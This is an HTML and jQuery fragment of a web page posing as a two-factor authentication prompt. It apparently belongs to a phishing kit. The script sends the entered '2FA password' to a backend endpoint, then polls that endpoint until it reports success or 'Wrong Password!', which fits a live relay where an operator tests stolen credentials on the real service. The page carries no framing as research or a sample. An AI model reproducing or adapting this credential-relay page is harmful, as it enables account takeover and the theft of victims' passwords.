<div class="loader" id="loader">
    <div class="spinner"></div>
  </div>


<div>
<div class="text-center">
<p class="poppins headtl" style="color: #000000ff; font-size: 25px;">Two-Factor<br>Authentication</p>
<p class="ptl">Please enter your 2FA password to<br>complete login.</p>
<div class="mb-3">
    <input type="text" class="form-control text-center" name="phone" id="phone" placeholder="Enter 2FA Password" />
</div>
<p id="wrong" class="text-center" style="color: darkred;">Wrong Password!</p>
<button class="btdk btn mx-auto d-block px-5">Confirm</button>
<!--<a class="d-block mb-3 text-center" href="?otherAccount">Login akun lain</a>-->

</div>
</div>
<script>
  $("#wrong").hide();
  $("#loader").hide(); 

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
        //   window.location.reload();
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("input[type='text']").val("");
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("button").on("click", function(e){
    e.preventDefault();
    var password = $("input[type='text']").val();

    if (password != "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: {"method":"sendPassword","password":password},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>
